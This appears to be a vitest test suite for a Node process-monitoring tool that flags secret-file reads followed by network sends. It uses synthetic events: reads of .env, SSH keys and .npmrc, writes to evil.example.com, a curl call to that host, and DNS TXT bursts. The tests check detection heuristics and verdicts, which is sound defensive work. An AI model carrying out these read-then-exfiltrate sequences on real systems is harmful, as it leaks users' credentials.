import { describe, expect, it } from 'vitest';
import { analyze } from '../src/analyze/index.js';
import { findChains, collectSensitiveReads } from '../src/analyze/chains.js';
import { oddTldDns, rawIpConnections, tlsNoData, txtBurst, longLivedHighWrite } from '../src/analyze/heuristics.js';
import { buildConns, sortEvents } from '../src/analyze/model.js';
import type { TattleEvent } from '../src/events.js';

// ---- synthetic event builders ----
let seqs = new Map<number, number>();
const T0 = 1_700_000_000_000;
function ev(p: Partial<TattleEvent> & { cat: TattleEvent['cat']; op: string; target: string; ts: number }): TattleEvent {
  const pid = p.pid ?? 100;
  const seq = seqs.get(pid) ?? 0;
  seqs.set(pid, seq + 1);
  return { v: 1, pid, ppid: 1, seq, phase: 'run', ...p } as TattleEvent;
}
const reset = () => (seqs = new Map());
const secretRead = (ts: number, bytes: number, pid = 100, target = '/h/.env') =>
  ev({ cat: 'fs', op: 'read', target, ts, pid, bytes, verdictHint: 'sensitive', detail: { rule: 'dotenv', label: 'dotenv file', severity: 'high', category: 'env-file' } });
const sock = (ts: number, target: string, bytesWritten: number, o: { pid?: number; sid?: number; firstWrite?: number | null; partial?: boolean; tls?: boolean; bytesRead?: number; closeTs?: number; ppid?: number } = {}) => {
  const pid = o.pid ?? 100;
  const sid = o.sid ?? 1;
  const fw = o.firstWrite === null ? undefined : (o.firstWrite ?? ts + 5);
  return [
    ev({ cat: 'net', op: 'connect', target, ts, pid, ppid: o.ppid ?? 1, detail: { sid, tls: !!o.tls } }),
    ev({ cat: 'net', op: 'close', target, ts: o.closeTs ?? ts + 50, pid, ppid: o.ppid ?? 1, bytes: bytesWritten, detail: { sid, tls: !!o.tls, bytesWritten, bytesRead: o.bytesRead ?? 3, connectTs: ts, ...(fw !== undefined ? { firstWriteTs: fw } : {}), ...(o.partial ? { partial: true } : {}) } }),
  ];
};

describe('chains (T2.2)', () => {
  it('flags read -> same-pid write of >=0.8x bytes to an unknown host within the window (high)', () => {
    reset();
    const events = [secretRead(T0, 1200), ...sock(T0 + 100, 'evil.example.com:443', 1100)];
    const chains = findChains(events, collectSensitiveReads(events));
    expect(chains).toHaveLength(1);
    expect(chains[0]).toMatchObject({ kind: 'file-to-socket', confidence: 'high' });
    expect(chains[0]!.sink.host).toBe('evil.example.com');
    expect(chains[0]!.explanation).toMatch(/Correlation, not proof/);
  });

  it('does not flag: write too small, outside window, to a good host, or to local by default', () => {
    reset();
    const small = [secretRead(T0, 1200), ...sock(T0 + 100, 'evil.example.com:443', 500)];
    expect(findChains(small, collectSensitiveReads(small))).toHaveLength(0);
    reset();
    const late = [secretRead(T0, 100), ...sock(T0 + 6000, 'evil.example.com:443', 500)];
    expect(findChains(late, collectSensitiveReads(late))).toHaveLength(0);
    expect(findChains(late, collectSensitiveReads(late), { windowMs: 10_000 })).toHaveLength(1);
    reset();
    const good = [secretRead(T0, 100), ...sock(T0 + 100, 'api.anthropic.com:443', 500)];
    expect(findChains(good, collectSensitiveReads(good))).toHaveLength(0);
    reset();
    const local = [secretRead(T0, 100), ...sock(T0 + 100, '127.0.0.1:9999', 500)];
    expect(findChains(local, collectSensitiveReads(local))).toHaveLength(0);
    expect(findChains(local, collectSensitiveReads(local), { includeLocal: true })).toHaveLength(1);
  });

  it('does not flag a write that precedes the read', () => {
    reset();
    const events = [...sock(T0, 'evil.example.com:443', 500, { firstWrite: T0 + 1 }), secretRead(T0 + 100, 100)];
    expect(findChains(events, collectSensitiveReads(events))).toHaveLength(0);
  });

  it('descendant pid gives medium confidence; unrelated pid gives none', () => {
    reset();
    const child = [secretRead(T0, 100, 100), ...sock(T0 + 100, 'evil.example.com:443', 500, { pid: 200, ppid: 100 })];
    const c = findChains(child, collectSensitiveReads(child));
    expect(c).toHaveLength(1);
    expect(c[0]!.confidence).toBe('medium');
    reset();
    const other = [secretRead(T0, 100, 100), ...sock(T0 + 100, 'evil.example.com:443', 500, { pid: 300, ppid: 1 })];
    expect(findChains(other, collectSensitiveReads(other))).toHaveLength(0);
  });

  it('proc network escape (curl) and clipboard -> network are medium chains', () => {
    reset();
    const proc = [secretRead(T0, 100), ev({ cat: 'proc', op: 'spawnSync', target: 'curl', ts: T0 + 200, verdictHint: 'escape', detail: { networkEscape: true, tool: 'curl', argv: ['curl', 'https://evil.example.com/x'] } })];
    const c = findChains(proc, collectSensitiveReads(proc));
    expect(c).toHaveLength(1);
    expect(c[0]).toMatchObject({ kind: 'file-to-proc', confidence: 'medium' });
    expect(c[0]!.sink.host).toBe('evil.example.com');
    reset();
    const clip = [ev({ cat: 'clip', op: 'read', target: 'pbpaste', ts: T0, verdictHint: 'sensitive' }), ...sock(T0 + 100, 'evil.example.com:443', 20)];
    const cc = findChains(clip, collectSensitiveReads(clip));
    expect(cc).toHaveLength(1);
    expect(cc[0]).toMatchObject({ kind: 'clipboard-to-socket', confidence: 'medium' });
  });

  it('ignores failed reads', () => {
    reset();
    const e = secretRead(T0, 100);
    e.detail = { ...e.detail, error: 'ENOENT' };
    expect(collectSensitiveReads([e])).toHaveLength(0);
  });
});

describe('probed vs read (failed sensitive accesses)', () => {
  const failed = (ts: number, target: string) => {
    const e = secretRead(ts, 0, 100, target);
    delete (e as any).bytes;
    e.detail = { ...e.detail, error: 'ENOENT' };
    return e;
  };
  it('failed probes alone: CLEAN, no reads, no chains, one low PROBED_SECRETS reason', () => {
    reset();
    const a = analyze([failed(T0, '/h/.env'), failed(T0 + 1, '/h/.ssh/id_rsa'), ...sock(T0 + 50, 'evil.example.com:443', 5000)]);
    expect(a.sensitiveReads).toHaveLength(0);
    expect(a.probes).toHaveLength(2);
    expect(a.chains).toHaveLength(0);
    expect(a.verdict).not.toBe('READING SECRETS');
    expect(a.verdict).not.toBe('ESCAPE CHAIN');
    const r = a.reasons.find((x) => x.code === 'PROBED_SECRETS')!;
    expect(r.severity).toBe('low');
    expect(r.text).toBe('probed 2 secret-shaped paths (not found)');
  });
  it('probes only on a quiet run keep the verdict CLEAN', () => {
    reset();
    expect(analyze([failed(T0, '/h/.env')]).verdict).toBe('CLEAN');
  });
  it('a successful read still counts as read alongside probes', () => {
    reset();
    const a = analyze([failed(T0, '/h/.npmrc'), secretRead(T0 + 5, 100)]);
    expect(a.sensitiveReads).toHaveLength(1);
    expect(a.probes).toHaveLength(1);
    expect(a.verdict).toBe('READING SECRETS');
  });
});

describe('heuristics (T2.3)', () => {
  it('raw IP connections (public medium, private low, loopback ignored)', () => {
    reset();
    const events = [...sock(T0, '8.8.8.8:443', 10, { sid: 1 }), ...sock(T0 + 10, '10.0.0.5:80', 10, { sid: 2 }), ...sock(T0 + 20, '127.0.0.1:80', 10, { sid: 3 })];
    const f = rawIpConnections(events, buildConns(events));
    expect(f.map((x) => [x.code, x.severity])).toEqual([['RAW_IP_CONNECTION', 'medium'], ['RAW_IP_CONNECTION', 'low']]);
  });

  it('odd-TLD DNS queries', () => {
    reset();
    const events = [ev({ cat: 'dns', op: 'lookup', target: 'payload.evil.zip', ts: T0 }), ev({ cat: 'dns', op: 'lookup', target: 'example.com', ts: T0 + 1 })];
    const f = oddTldDns(events);
    expect(f).toHaveLength(1);
    expect(f[0]!.text).toContain('.zip');
  });

  it('TXT burst only above the threshold within the window', () => {
    reset();
    const mk = (n: number, gap: number) => Array.from({ length: n }, (_, i) => ev({ cat: 'dns', op: 'resolve', target: `a${i}.t.example.net`, ts: T0 + i * gap, detail: { rrtype: 'TXT' } }));
    expect(txtBurst(mk(11, 100))).toHaveLength(1);
    expect(txtBurst(mk(10, 100))).toHaveLength(0);
    expect(txtBurst(mk(11, 5000))).toHaveLength(0); // spread out
  });

  it('long-lived high-write socket; local ignored unless includeLocal', () => {
    reset();
    const events = sock(T0, 'x.example.com:443', 5 * 1024 * 1024, { closeTs: T0 + 60_000 });
    expect(longLivedHighWrite(events, buildConns(events))).toHaveLength(1);
    reset();
    const short = sock(T0, 'x.example.com:443', 5 * 1024 * 1024, { closeTs: T0 + 1000 });
    expect(longLivedHighWrite(short, buildConns(short))).toHaveLength(0);
    reset();
    const loc = sock(T0, '127.0.0.1:1', 5 * 1024 * 1024, { closeTs: T0 + 60_000 });
    expect(longLivedHighWrite(loc, buildConns(loc))).toHaveLength(0);
    expect(longLivedHighWrite(loc, buildConns(loc), { includeLocal: true })).toHaveLength(1);
  });

  it('TLS with no data is reported as unclassified, low severity', () => {
    reset();
    const events = sock(T0, 'x.example.com:443', 0, { tls: true, bytesRead: 0 });
    const f = tlsNoData(events, buildConns(events));
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ severity: 'low' });
    expect(f[0]!.text).toMatch(/unclassified/);
  });
});

describe('verdict (T2.4)', () => {
  const verdictOf = (events: TattleEvent[], o = {}) => analyze(events, o).verdict;

  it('no events (nothing hooked) => NOT OBSERVED, never CLEAN', () => {
    const a = analyze([]);
    expect(a.verdict).toBe('NOT OBSERVED');
    expect(a.coverage).toMatchObject({ hookedProcesses: 0, rootHooked: true });
    expect(a.reasons[0]!.text).toMatch(/not a clean bill of health/);
  });

  it('partial coverage: root not hooked but a descendant was => computed verdict plus a note', () => {
    reset();
    const a = analyze([ev({ cat: 'life', op: 'start', target: 'node', ts: T0, pid: 200, ppid: 150 })], {}, { pid: 150, argv0: '/bin/sh' });
    expect(a.verdict).toBe('CLEAN');
    expect(a.coverage).toMatchObject({ hookedProcesses: 1, rootHooked: false });
    expect(a.coverage!.note).toBe('partial coverage: sh is not a Node process; only 1 Node descendant observed');
    expect(a.reasons.some((r) => r.code === 'PARTIAL_COVERAGE')).toBe(true);
    expect(analyze([ev({ cat: 'life', op: 'start', target: 'node', ts: T0, pid: 150, ppid: 1 })], {}, { pid: 150, argv0: 'node' }).coverage!.rootHooked).toBe(true);
  });

  it('quiet => CLEAN', () => {
    reset();
    expect(verdictOf([ev({ cat: 'fs', op: 'write', target: '/tmp/x', ts: T0 }), ...sock(T0 + 1, 'registry.npmjs.org:443', 10)])).toBe('CLEAN');
  });

  it('precedence: telemetry => PHONING HOME; sensitive read => READING SECRETS; chain => ESCAPE CHAIN', () => {
    reset();
    expect(verdictOf(sock(T0, 'api.segment.io:443', 10))).toBe('PHONING HOME');
    reset();
    expect(verdictOf(sock(T0, 'evil.example.com:443', 10))).toBe('PHONING HOME');
    reset();
    expect(verdictOf([secretRead(T0, 100), ...sock(T0 + 10, 'api.segment.io:443', 10)])).toBe('READING SECRETS'); // too small for a chain
    reset();
    expect(verdictOf([secretRead(T0, 100), ...sock(T0 + 10, 'evil.example.com:443', 500)])).toBe('ESCAPE CHAIN');
  });

  it('low-severity sensitive reads alone stay CLEAN; medium+ triggers READING SECRETS', () => {
    reset();
    const low = ev({ cat: 'fs', op: 'read', target: '/h/.zsh_history', ts: T0, bytes: 5, verdictHint: 'sensitive', detail: { rule: 'x', severity: 'low' } });
    expect(verdictOf([low])).toBe('CLEAN');
    const med = ev({ cat: 'fs', op: 'read', target: '/h/.npmrc', ts: T0, bytes: 5, verdictHint: 'sensitive', detail: { rule: 'npmrc', severity: 'medium' } });
    expect(verdictOf([med])).toBe('READING SECRETS');
  });

  it('local hosts are benign unless includeLocal', () => {
    reset();
    const events = sock(T0, '127.0.0.1:8080', 10);
    expect(verdictOf(events)).toBe('CLEAN');
    expect(verdictOf(events, { includeLocal: true })).toBe('PHONING HOME');
  });

  it('is deterministic, order-independent and cites evidence for every reason', () => {
    reset();
    const events = [secretRead(T0, 100), ...sock(T0 + 10, 'evil.example.com:443', 500), ev({ cat: 'env', op: 'read', target: 'HOME', ts: T0 + 1 })];
    const a = analyze(events);
    const b = analyze([...events].reverse());
    expect(JSON.stringify(a)).toBe(JSON.stringify(b));
    expect(JSON.stringify(analyze(events))).toBe(JSON.stringify(a));
    for (const r of a.reasons) expect(r.evidence.length).toBeGreaterThan(0);
    const sorted = sortEvents(events);
    for (const r of a.reasons) for (const p of r.evidence) expect(sorted[p.line]).toMatchObject({ pid: p.pid, seq: p.seq });
    expect(a.envNames).toEqual(['HOME']);
    expect(a.reasons[0]!.text).toMatch(/^read 1 secret-shaped file, then wrote/);
    expect(JSON.stringify(a.reasons)).not.toMatch(/stole|steal/i);
  });
});
